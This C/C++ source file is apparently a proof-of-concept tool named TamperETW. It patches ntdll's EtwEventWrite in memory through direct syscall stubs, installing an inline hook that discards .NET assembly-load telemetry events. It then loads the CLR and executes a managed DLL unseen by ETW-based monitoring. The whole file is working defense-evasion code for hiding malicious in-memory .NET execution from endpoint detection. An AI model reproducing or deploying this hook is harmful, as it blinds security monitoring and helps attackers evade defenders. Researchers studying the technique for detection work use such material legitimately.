#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#define AssemblyDCStart_V1 155

#include <Windows.h>
#include <stdio.h>
#include <metahost.h>
#include <evntprov.h>
#include "TamperETW.h"

#pragma comment(lib, "mscoree.lib")

// mov rax, <Hooked function address>  
// jmp rax
UCHAR uHook[] = {
	0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0xE0
};

ULONG NTAPI MyEtwEventWrite(
	__in REGHANDLE RegHandle,
	__in PCEVENT_DESCRIPTOR EventDescriptor,
	__in ULONG UserDataCount,
	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData) 
{
	ULONG uResult = 0;

	_EtwEventWriteFull EtwEventWriteFull = (_EtwEventWriteFull)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWriteFull");
	if (EtwEventWriteFull == NULL) {
		return 1;
	}

	// Block CLR assembly loading events.
	if (EventDescriptor->Id == AssemblyDCStart_V1) {
		return uResult;
	}

	// Forward all other ETW events using EtwEventWriteFull.
	uResult = EtwEventWriteFull(RegHandle, EventDescriptor, 0, NULL, NULL, UserDataCount, UserData);

	return uResult;
}

BOOL InlineHook(LPVOID lpFuncAddress) {
	PNT_TIB pTIB = NULL;
	PTEB pTEB = NULL;
	PPEB pPEB = NULL;

	// Get pointer to the TEB
	pTIB = (PNT_TIB)__readgsqword(0x30);
	pTEB = (PTEB)pTIB->Self;

	// Get pointer to the PEB
	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
	if (pPEB == NULL) {
		return FALSE;
	}

	if (pPEB->OSMajorVersion == 10 && pPEB->OSMinorVersion == 0) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 1 && pPEB->OSBuildNumber == 7601) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 2) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
	}
	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 3) {
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
	}
	else {
		return FALSE;
	}

	LPVOID lpBaseAddress = lpFuncAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = sizeof(uHook);
	NTSTATUS status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	status = ZwWriteVirtualMemory(NtCurrentProcess(), lpFuncAddress, (PVOID)uHook, sizeof(uHook), NULL);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	status = ZwProtectVirtualMemory(NtCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

	return TRUE;
}


int wmain(int argc, wchar_t* argv[]) {
	BOOL bResult = FALSE;
	HRESULT hr;
	ICLRMetaHost *pMetaHost = NULL;
	IEnumUnknown *installedRuntimes = NULL;
	ICLRRuntimeInfo *runtimeInfo = NULL;
	ICLRRuntimeHost *runtimeHost = NULL;
	ULONG fetched = 0;
	DWORD pReturnValue = 0;
	LPWSTR lpwMessage = NULL;

	wprintf(L"[+] Patching EtwEventWrite\n");
	LPVOID lpFuncAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), "EtwEventWrite");

	// Add address of hook function to patch.
	*(DWORD64*)&uHook[2] = (DWORD64)MyEtwEventWrite;

	if (!InlineHook(lpFuncAddress)) {
		wprintf(L"[!] Error: Patching EtwEventWrite failed...\n");
	}

	wprintf(L"[+] Now Loading CLR...\n");

	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
	if (hr != S_OK) {
		wprintf(L"[!] Error: CLRCreateInstance...\n");
		goto Cleanup;
	}

	hr = pMetaHost->EnumerateInstalledRuntimes(&installedRuntimes);
	if (hr != S_OK) {
		wprintf(L"[!] Error: EnumerateInstalledRuntimes...\n");
		goto Cleanup;
	}

	WCHAR versionString[20];
	while ((hr = installedRuntimes->Next(1, (IUnknown **)&runtimeInfo, &fetched)) == S_OK && fetched > 0) {
		DWORD versionStringSize = 20;
		hr = runtimeInfo->GetVersionString(versionString, &versionStringSize);
		
		if (runtimeInfo != NULL) {
			wprintf(L"[+] Supported Framework: %s\n", versionString);
		}

		if (versionStringSize >= 2 && versionString[1] == '4') {	// Look for .NET 4.0 runtime.
			wprintf(L"[+] Using runtime: %s\n", versionString);
			break;
		}
	}

	hr = runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (void **)&runtimeHost);
	if (hr != S_OK) {
		wprintf(L"[!] Error: GetInterface(CLSID_CLRRuntimeHost...) failed...\n");
		goto Cleanup;
	}

	hr = runtimeHost->Start();
	if (hr != S_OK) {
		wprintf(L"[!] Error: Start runtimeHost failed...\n");
		goto Cleanup;
	}

	lpwMessage = (LPWSTR)calloc(1, MAX_PATH * 2);
	wcscpy_s(lpwMessage, 128, L"Hello from .NET Framework: ");
	wcscat_s(lpwMessage, 64, versionString);
	wcscat_s(lpwMessage, 128, L"\nCheck ETW telemetry for loaded .NET assemblies.");

	wprintf(L"\n[+] ====== Calling .NET Code ======\n");
	hr = runtimeHost->ExecuteInDefaultAppDomain(
		L"..\\..\\ManagedDLL\\bin\\Release\\ManagedDLL.dll",
		L"dllNamespace.dllClass",
		L"ShowMsg",
		lpwMessage,
		&pReturnValue);

	if (hr != S_OK) {
		wprintf(L"[!] Error: ExecuteInDefaultAppDomain failed...\n");
		goto Cleanup;
	}

	wprintf(L"[+] Done\n");

	free(lpwMessage);
	hr = runtimeHost->Stop();
	hr = runtimeHost->Release();

Cleanup:

	if (pMetaHost) {
		pMetaHost->Release();
		pMetaHost = NULL;
	}

	return 0;
}